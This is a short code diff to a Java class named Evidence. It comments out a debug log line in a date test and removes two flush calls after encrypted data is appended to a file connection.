@@ -343,7 +343,7 @@ final class Evidence {
 			final DateTime dt = new DateTime(datetime.getDate());
 			boolean hitest = dt.hiDateTime() == datetime.hiDateTime();
 			boolean lowtest = dt.lowDateTime() == datetime.lowDateTime();
-			Check.log(dt + " ticks: " + dt.getTicks());
+			//Check.log(dt + " ticks: " + dt.getTicks());
 			Check.asserts(hitest, "hi test");
 			Check.asserts(lowtest, "low test");
 		}
@@ -427,7 +427,7 @@ final class Evidence {
 		try {
 			fconn.append(ByteArray.intToByteArray(data.length - offset));
 			fconn.append(encData);
-			fconn.flush();
+
 		} catch (final Exception e) {
 			if (Cfg.EXCEPTION) {
 				Check.log(e);
@@ -500,7 +500,7 @@ final class Evidence {
 				encData = encryption.appendData(data, offset, len, lastBlock);
 				fconn.append(encData);
 			}
-			fconn.flush();
+
 		} catch (final Exception e) {
 			if (Cfg.EXCEPTION) {
 				Check.log(e);
